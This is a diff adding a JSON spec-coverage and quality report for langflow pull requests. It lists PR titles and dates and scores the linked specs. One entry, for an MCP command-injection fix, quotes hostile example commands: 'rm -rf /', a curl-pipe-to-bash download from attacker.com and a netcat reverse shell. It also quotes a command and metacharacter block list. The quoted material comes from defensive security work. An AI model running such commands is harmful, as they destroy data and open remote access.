@@ -1,0 +1,2713 @@
+{
+  "repo": "langflow-ai/langflow",
+  "lookback_days": 365,
+  "rework_window_days": 30,
+  "coverage": {
+    "coverage_pct": 17,
+    "total_prs": 90,
+    "specd_prs": 15,
+    "prs": [
+      {
+        "number": 12202,
+        "sha": null,
+        "title": "fix: enforce message ownership in monitor endpoints",
+        "specd": true,
+        "spec_source": "LE-593",
+        "merged_at": "2026-03-30T20:11:36+00:00"
+      },
+      {
+        "number": 12383,
+        "sha": null,
+        "title": "deps: add official wxo client package to langflow-base complete",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-30T18:54:19+00:00"
+      },
+      {
+        "number": 12373,
+        "sha": null,
+        "title": "feat(deployments): add environment variable overrides for IBM IAM URLs (wxO)",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-30T16:35:29+00:00"
+      },
+      {
+        "number": 12369,
+        "sha": null,
+        "title": "ci: upgrade runtime to python:3.14.3-slim-trixie",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-29T20:38:35+00:00"
+      },
+      {
+        "number": 12273,
+        "sha": null,
+        "title": "docs: docling dependencies for langflow desktop and updated Desktop env vars",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-23T17:20:45+00:00"
+      },
+      {
+        "number": 12365,
+        "sha": null,
+        "title": "ref: add feature flag around BE wxo deployments",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-27T18:34:25+00:00"
+      },
+      {
+        "number": 12371,
+        "sha": null,
+        "title": "chore: update deps due to security vulnerabilities",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-28T00:01:32+00:00"
+      },
+      {
+        "number": 12305,
+        "sha": null,
+        "title": "fix: enforce ownership check in build_flow endpoint (GHSA-qj98-rhf8-v93f)",
+        "specd": true,
+        "spec_source": "LE-700",
+        "merged_at": "2026-03-27T22:17:15+00:00"
+      },
+      {
+        "number": 12331,
+        "sha": null,
+        "title": "fix: replace grep -oP with sed for Node.js version extraction in Docker builds",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-27T21:24:07+00:00"
+      },
+      {
+        "number": 12290,
+        "sha": null,
+        "title": "fix: prevent MCP command injection via allowlist validation (CWE-78)",
+        "specd": true,
+        "spec_source": "LE-536",
+        "merged_at": "2026-03-27T03:02:57+00:00"
+      },
+      {
+        "number": 12108,
+        "sha": null,
+        "title": "feat: add core deployment implementation",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-26T22:15:38+00:00"
+      },
+      {
+        "number": 12323,
+        "sha": null,
+        "title": "fix: update PyTorch to 2.6.0+ to fix torch.load() RCE vulnerability",
+        "specd": true,
+        "spec_source": "LE-705",
+        "merged_at": "2026-03-26T20:08:54+00:00"
+      },
+      {
+        "number": 12349,
+        "sha": null,
+        "title": "fix(mcp): Stop sending API key as Bearer token in MCP client ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-26T19:08:53+00:00"
+      },
+      {
+        "number": 12337,
+        "sha": null,
+        "title": "fix: prevent path traversal in knowledge base create endpoint ",
+        "specd": true,
+        "spec_source": "LE-711",
+        "merged_at": "2026-03-26T18:42:20+00:00"
+      },
+      {
+        "number": 12208,
+        "sha": null,
+        "title": "feat(ui): Add custom build error message transform hook",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-26T18:11:32+00:00"
+      },
+      {
+        "number": 12288,
+        "sha": null,
+        "title": "fix(core): Add environment variable fallback for provider API key resolution                                                                            ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-26T17:59:15+00:00"
+      },
+      {
+        "number": 12300,
+        "sha": null,
+        "title": "fix: Add ephemeral file upload support                                                                              ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-26T17:59:15+00:00"
+      },
+      {
+        "number": 12347,
+        "sha": null,
+        "title": "fix: Use plain axios for external GitHub and Discord API calls ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-26T17:51:10+00:00"
+      },
+      {
+        "number": 12334,
+        "sha": null,
+        "title": "fix: disable dangerous deserialization by default in FAISS component \u2026",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-26T13:03:49+00:00"
+      },
+      {
+        "number": 12335,
+        "sha": null,
+        "title": "chore: version bump and merge 1.8.2",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-26T08:22:03+00:00"
+      },
+      {
+        "number": 12328,
+        "sha": null,
+        "title": "Fix: session metadata migration consistency",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T21:02:52+00:00"
+      },
+      {
+        "number": 12329,
+        "sha": null,
+        "title": "fix: prevent overwriting user-selected global variables in provider c\u2026",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T20:53:37+00:00"
+      },
+      {
+        "number": 12333,
+        "sha": null,
+        "title": " fix: Add ephemeral file upload and credential env fallback                                                                                  ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T19:48:54+00:00"
+      },
+      {
+        "number": 11999,
+        "sha": null,
+        "title": "fix: disable dangerous deserialization by default in FAISS component",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T19:49:36+00:00"
+      },
+      {
+        "number": 12330,
+        "sha": null,
+        "title": "fix: replace grep -oP with sed for Node.js version extraction in Docker images",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T19:17:41+00:00"
+      },
+      {
+        "number": 12243,
+        "sha": null,
+        "title": "fix: prevent path traversal in knowledge base bulk delete",
+        "specd": true,
+        "spec_source": "LE-634",
+        "merged_at": "2026-03-25T18:52:56+00:00"
+      },
+      {
+        "number": 12119,
+        "sha": null,
+        "title": "feat(playground): add bulk delete sessions with Select All functionality",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T15:51:41+00:00"
+      },
+      {
+        "number": 12255,
+        "sha": null,
+        "title": "feat: add session_metadata JSON column to message table",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T15:22:42+00:00"
+      },
+      {
+        "number": 12254,
+        "sha": null,
+        "title": "fix: File Manager last item cut off in normal view",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T13:54:08+00:00"
+      },
+      {
+        "number": 12257,
+        "sha": null,
+        "title": "test: add PostgreSQL to migration CI tests",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T13:48:59+00:00"
+      },
+      {
+        "number": 12304,
+        "sha": null,
+        "title": "feat(models): Add latest OpenAI GPT-5.3 and GPT-5.4 model families                                                                                   ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T12:51:37+00:00"
+      },
+      {
+        "number": 12309,
+        "sha": null,
+        "title": "fix(docker): Remove broken npm self-upgrade from Docker images",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T12:07:24+00:00"
+      },
+      {
+        "number": 12268,
+        "sha": null,
+        "title": "fix: Handle multiple outputs in ComponentToolkit and clean edge logic                                                                          ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-25T11:48:47+00:00"
+      },
+      {
+        "number": 12286,
+        "sha": null,
+        "title": "fix: resolve File Component 'no component context' error for non-ASCII files",
+        "specd": true,
+        "spec_source": "#11548",
+        "merged_at": "2026-03-24T20:36:14+00:00"
+      },
+      {
+        "number": 12297,
+        "sha": null,
+        "title": "fix(test): Fix Playwright E2E tests and backend compatibility on Windows",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-24T19:45:03+00:00"
+      },
+      {
+        "number": 12294,
+        "sha": null,
+        "title": "test: add playwright code coverage",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-23T21:17:31+00:00"
+      },
+      {
+        "number": 12292,
+        "sha": null,
+        "title": "docs: cherry pick 1.8 changes from main to release",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-23T18:45:25+00:00"
+      },
+      {
+        "number": 12253,
+        "sha": null,
+        "title": "fix: support ZIP file upload for flows and projects endpoints",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-23T18:32:25+00:00"
+      },
+      {
+        "number": 12275,
+        "sha": null,
+        "title": "fix: Rebuild the embedding model in the nv template",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-23T18:27:41+00:00"
+      },
+      {
+        "number": 12274,
+        "sha": null,
+        "title": "docs: gemini3 tool calling is temporarily disabled",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-23T17:43:12+00:00"
+      },
+      {
+        "number": 12247,
+        "sha": null,
+        "title": "docs: contribute to next release candidate branch and not main",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-23T17:21:45+00:00"
+      },
+      {
+        "number": 12078,
+        "sha": null,
+        "title": "fix(deps): pin tar-fs to >=2.1.4 to fix symlink following vulnerability",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-23T13:57:06+00:00"
+      },
+      {
+        "number": 12263,
+        "sha": null,
+        "title": "fix: Sanitize folder names for CodeQL",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-20T21:54:53+00:00"
+      },
+      {
+        "number": 12264,
+        "sha": null,
+        "title": "feat: Add Windows Playwright tests to nightly builds",
+        "specd": true,
+        "spec_source": "LE-566",
+        "merged_at": "2026-03-20T20:35:06+00:00"
+      },
+      {
+        "number": 12265,
+        "sha": null,
+        "title": "feat: Add Windows Playwright test fixes to RC",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-20T19:38:54+00:00"
+      },
+      {
+        "number": 12234,
+        "sha": null,
+        "title": "fix: protect image downloads by flow ownership",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-20T15:10:12+00:00"
+      },
+      {
+        "number": 12460,
+        "sha": null,
+        "title": "feat: wxo custom tool naming",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T13:39:40+00:00"
+      },
+      {
+        "number": 12319,
+        "sha": null,
+        "title": "feat: opensearch multimodal: support filters, adjust defaults",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T13:29:09+00:00"
+      },
+      {
+        "number": 12459,
+        "sha": null,
+        "title": "ref: remove resource name prefix",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T13:07:53+00:00"
+      },
+      {
+        "number": 12453,
+        "sha": null,
+        "title": "feat(deployments): add paginated deployment flow-version listing",
+        "specd": true,
+        "spec_source": "DB-ONLY",
+        "merged_at": "2026-04-02T12:47:26+00:00"
+      },
+      {
+        "number": 12368,
+        "sha": null,
+        "title": "docs: point security reports to hackerone",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T02:06:50+00:00"
+      },
+      {
+        "number": 12440,
+        "sha": null,
+        "title": "feat: add update existing deployment from canvas deploy button",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T01:27:10+00:00"
+      },
+      {
+        "number": 12435,
+        "sha": null,
+        "title": "Allow nonraw env vars wxo",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-01T23:48:46+00:00"
+      },
+      {
+        "number": 12445,
+        "sha": null,
+        "title": "fix: restore langflow-logo-color-black-solid.svg removed in docs release",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-01T21:11:41+00:00"
+      },
+      {
+        "number": 12448,
+        "sha": null,
+        "title": "chore: remove mypy from CI",
+        "specd": true,
+        "spec_source": "https://github.com/astral-sh/ty/issues/2403))",
+        "merged_at": "2026-04-01T20:58:57+00:00"
+      },
+      {
+        "number": 12271,
+        "sha": null,
+        "title": "fix: redact sensitive information from log output",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-01T20:16:37+00:00"
+      },
+      {
+        "number": 12359,
+        "sha": null,
+        "title": "fix: Support self-referential MCP JSON schema",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-01T20:09:19+00:00"
+      },
+      {
+        "number": 12204,
+        "sha": null,
+        "title": "fix: Always resolve first dep for determinism",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-01T19:11:22+00:00"
+      },
+      {
+        "number": 11891,
+        "sha": null,
+        "title": "feat: LE-374 token usage tracking for LLM and Agent components",
+        "specd": true,
+        "spec_source": "LE-374",
+        "merged_at": "2026-04-01T18:15:03+00:00"
+      },
+      {
+        "number": 12438,
+        "sha": null,
+        "title": "fix: Address a dictionary comprehension ruff error",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-01T17:43:33+00:00"
+      },
+      {
+        "number": 12425,
+        "sha": null,
+        "title": "feat: add extensibility for wxo tools in deployments api",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-01T15:29:04+00:00"
+      },
+      {
+        "number": 12436,
+        "sha": null,
+        "title": "fix(test): Add missing required `llm` field and fix flaky assertions in Watsonx tests                                             ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-01T12:38:21+00:00"
+      },
+      {
+        "number": 12434,
+        "sha": null,
+        "title": "fix(test): Add missing required `llm` field to Watsonx deployment mapper tests                                           ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-01T11:58:12+00:00"
+      },
+      {
+        "number": 12475,
+        "sha": null,
+        "title": "feat: add update agent impl",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T22:01:34+00:00"
+      },
+      {
+        "number": 12358,
+        "sha": null,
+        "title": "fix: Close popup when navigating to MCP settings",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T21:32:14+00:00"
+      },
+      {
+        "number": 12454,
+        "sha": null,
+        "title": "feat(deployments): refactor WXO deployment schemas and create response mapping",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T21:13:34+00:00"
+      },
+      {
+        "number": 12466,
+        "sha": null,
+        "title": "feat(ui): Add \"Connect other models\" option for model-type handles",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T20:25:51+00:00"
+      },
+      {
+        "number": 12446,
+        "sha": null,
+        "title": "fix: Import and Statistics fixes for Knowledge Bases",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T20:00:10+00:00"
+      },
+      {
+        "number": 12207,
+        "sha": null,
+        "title": "docs: add CI optimization analysis for pre-release builds",
+        "specd": true,
+        "spec_source": "LE-517",
+        "merged_at": "2026-04-02T17:59:21+00:00"
+      },
+      {
+        "number": 12245,
+        "sha": null,
+        "title": "feat: Langflow SDK and Flow DevOps API Toolkit",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T16:36:12+00:00"
+      },
+      {
+        "number": 12447,
+        "sha": null,
+        "title": "fix: restore langflow-logo-color-black-solid.svg removed in docs release",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T15:41:23+00:00"
+      },
+      {
+        "number": 12205,
+        "sha": null,
+        "title": "feat: MCP server UX improvements, batch, and spec-based flow creation",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T14:44:12+00:00"
+      },
+      {
+        "number": 12413,
+        "sha": null,
+        "title": "docs: block custom components with env var",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-04-02T14:23:38+00:00"
+      },
+      {
+        "number": 12389,
+        "sha": null,
+        "title": "feat(deployments): add list (llms) endpoint and wxo implementation",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T23:50:22+00:00"
+      },
+      {
+        "number": 11636,
+        "sha": null,
+        "title": "feat: Add Langflow Assistant chat panel for component generation",
+        "specd": true,
+        "spec_source": "LLM-BASED",
+        "merged_at": "2026-03-31T22:20:38+00:00"
+      },
+      {
+        "number": 12390,
+        "sha": null,
+        "title": "feat(wxo): list / update (agents) directly from Langflow API",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T22:13:32+00:00"
+      },
+      {
+        "number": 12421,
+        "sha": null,
+        "title": "fix: Fix shareable playground build events and message rendering ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T21:32:50+00:00"
+      },
+      {
+        "number": 12419,
+        "sha": null,
+        "title": "fix(deps): pin tar-fs to >=2.1.4 to fix symlink following vulnerabili\u2026",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T19:50:22+00:00"
+      },
+      {
+        "number": 12296,
+        "sha": null,
+        "title": "fix: Improve the sub-process handling of the Docling Worker",
+        "specd": true,
+        "spec_source": "JSON-COMPLIANT",
+        "merged_at": "2026-03-31T19:02:12+00:00"
+      },
+      {
+        "number": 12237,
+        "sha": null,
+        "title": "feat: MCP server for operating Langflow via REST API",
+        "specd": true,
+        "spec_source": "MCP-COMPATIBLE",
+        "merged_at": "2026-03-31T18:47:44+00:00"
+      },
+      {
+        "number": 12352,
+        "sha": null,
+        "title": "docs: rename data to JSON and dataframe to table",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T18:14:04+00:00"
+      },
+      {
+        "number": 12362,
+        "sha": null,
+        "title": "fix: resolve code scanning alerts for URL sanitization and insecure randomness",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T18:01:51+00:00"
+      },
+      {
+        "number": 12366,
+        "sha": null,
+        "title": "fix: Propagate error details to Playground chat on flow build    failure",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T18:00:52+00:00"
+      },
+      {
+        "number": 12306,
+        "sha": null,
+        "title": "docs: CSS redesign",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T17:16:55+00:00"
+      },
+      {
+        "number": 12412,
+        "sha": null,
+        "title": "fix: update npm dependencies",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T17:16:55+00:00"
+      },
+      {
+        "number": 12416,
+        "sha": null,
+        "title": "fix: Add platform markers to cuga extra for macOS x86_64",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T16:54:19+00:00"
+      },
+      {
+        "number": 12361,
+        "sha": null,
+        "title": "fix: Fix shareable playground build events and message rendering                                                                                                               ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T16:45:01+00:00"
+      },
+      {
+        "number": 12405,
+        "sha": null,
+        "title": "perf(test): Optimize CI tests causing timeout on Windows and Python 3.12",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T15:01:29+00:00"
+      },
+      {
+        "number": 12402,
+        "sha": null,
+        "title": "fix(test): Increase timeout and add waitFor on folder rename input                                                                ",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2026-03-31T09:53:14+00:00"
+      },
+      {
+        "number": 1,
+        "sha": null,
+        "title": "MemoryCustom node added",
+        "specd": false,
+        "spec_source": null,
+        "merged_at": "2023-02-12T19:43:27+00:00"
+      }
+    ]
+  },
+  "quality": {
+    "mode": "heuristic",
+    "average_score": 47,
+    "verdicts": {
+      "REVIEW": 15
+    },
+    "specs": [
+      {
+        "pr_number": 12202,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 99,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 45,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 83,
+            "type": "ambiguity",
+            "term": "correctly",
+            "suggestion": "Replace 'correctly' with a specific, measurable term"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "(no goals found)",
+            "suggestion": "No goals, requirements, or MUST statements found. Testability cannot be scored."
+          }
+        ],
+        "warnings": [
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No state transitions \u2014 AI may allow invalid transitions",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12305,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 100,
+        "testability": 29,
+        "consistency": 100,
+        "overall": 52,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Replace session.get(Flow, flowid) with a scoped query: Flow.userid == currentuse",
+            "suggestion": "Goal without test: 'Replace session.get(Flow, flowid) with a scoped query: Flow....' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Harden POST /api/v1/build/{job_id}/cancel: same ownership check \u2014 prevents a dif",
+            "suggestion": "Goal without test: 'Harden POST /api/v1/build/{job_id}/cancel: same ownership ch...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Add logger.awarning on ownership rejection in buildflow, getbuildevents, and can",
+            "suggestion": "Goal without test: 'Add logger.awarning on ownership rejection in buildflow, get...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Add jobowners registry with registerjobowner(), getjobowner(), and cleanup in cl",
+            "suggestion": "Goal without test: 'Add jobowners registry with registerjobowner(), getjobowner(...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Jobs started via buildpublictmp have no registered owner and remain accessible t",
+            "suggestion": "Goal without test: 'Jobs started via buildpublictmp have no registered owner and...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Cross-user build blocked (attacker cannot build victim's private flow)",
+            "suggestion": "Goal without test: 'Cross-user build blocked (attacker cannot build victim's pri...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Cross-user event polling blocked (attacker cannot read another user's job output",
+            "suggestion": "Goal without test: 'Cross-user event polling blocked (attacker cannot read anoth...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Cross-user cancel blocked (attacker cannot abort another user's running build)",
+            "suggestion": "Goal without test: 'Cross-user cancel blocked (attacker cannot abort another use...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Public flow remains accessible by any authenticated user",
+            "suggestion": "Goal without test: 'Public flow remains accessible by any authenticated user' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Unauthenticated request is rejected",
+            "suggestion": "Goal without test: 'Unauthenticated request is rejected' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No state transitions \u2014 AI may allow invalid transitions",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12290,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 98,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 44,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 48,
+            "type": "ambiguity",
+            "term": "correctly",
+            "suggestion": "Replace 'correctly' with a specific, measurable term"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "touch /tmp/pwned - File creation",
+            "suggestion": "Goal without test: 'touch /tmp/pwned - File creation' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "rm -rf / - System destruction",
+            "suggestion": "Goal without test: 'rm -rf / - System destruction' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "curl attacker.com/shell.sh | bash - Reverse shell",
+            "suggestion": "Goal without test: 'curl attacker.com/shell.sh | bash - Reverse shell' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "nc -e /bin/bash attacker.com 4444 - Remote access",
+            "suggestion": "Goal without test: 'nc -e /bin/bash attacker.com 4444 - Remote access' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Only allows: node, python, python3, npx, uvx, docker",
+            "suggestion": "Goal without test: 'Only allows: node, python, python3, npx, uvx, docker' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Blocks all other commands (rm, curl, wget, bash, sh, nc, touch, etc.)",
+            "suggestion": "Goal without test: 'Blocks all other commands (rm, curl, wget, bash, sh, nc, tou...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Blocks: ;, |, &, $, `  `, (, ), <, >, \\n, \\r",
+            "suggestion": "Goal without test: 'Blocks: ;, |, &, $, `  `, (, ), <, >, \\n, \\r' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Prevents command injection via argument manipulation",
+            "suggestion": "Goal without test: 'Prevents command injection via argument manipulation' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Handles Windows paths: C:\\Program Files\\nodejs\\node.exe",
+            "suggestion": "Goal without test: 'Handles Windows paths: C:\\Program Files\\nodejs\\node.exe' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Handles Unix paths: /usr/bin/node",
+            "suggestion": "Goal without test: 'Handles Unix paths: /usr/bin/node' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12323,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 99,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 45,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 52,
+            "type": "ambiguity",
+            "term": "better",
+            "suggestion": "Replace 'better' with a specific, measurable term"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Issue: RCE vulnerability in PyTorch's \\torch.load()\\ function",
+            "suggestion": "Goal without test: 'Issue: RCE vulnerability in PyTorch's \\torch.load()\\ functio...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Affected Versions: PyTorch < 2.6.0",
+            "suggestion": "Goal without test: 'Affected Versions: PyTorch < 2.6.0' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Patched Version: PyTorch 2.6.0+",
+            "suggestion": "Goal without test: 'Patched Version: PyTorch 2.6.0+' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Severity: High - Allows arbitrary code execution when loading untrusted model fi",
+            "suggestion": "Goal without test: 'Severity: High - Allows arbitrary code execution when loadin...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Updated PyTorch constraint: \\\\\"torch>=2.0.0\\\"\\ \u2192 \\\\\"torch>=2.6.0\\\"\\",
+            "suggestion": "Goal without test: 'Updated PyTorch constraint: \\\\\"torch>=2.0.0\\\"\\ \u2192 \\\\\"torch>=2...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Updated onnxruntime constraint: \\\\\"onnxruntime>=1.20,<=1.23\\\"\\ \u2192 \\\\\"onnxruntime>",
+            "suggestion": "Goal without test: 'Updated onnxruntime constraint: \\\\\"onnxruntime>=1.20,<=1.23\\...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Added inline comment documenting the security fix",
+            "suggestion": "Goal without test: 'Added inline comment documenting the security fix' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Updated agent-lifecycle-toolkit: \\\\\"agent-lifecycle-toolkit~=0.4.4\\\"\\ \u2192 \\\\\"agent",
+            "suggestion": "Goal without test: 'Updated agent-lifecycle-toolkit: \\\\\"agent-lifecycle-toolkit~...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Added comments explaining compatibility requirements",
+            "suggestion": "Goal without test: 'Added comments explaining compatibility requirements' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "PyTorch is not a core dependency of Langflow",
+            "suggestion": "Goal without test: 'PyTorch is not a core dependency of Langflow' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Only affects users who explicitly install: \\pip install langflow[docling]\\",
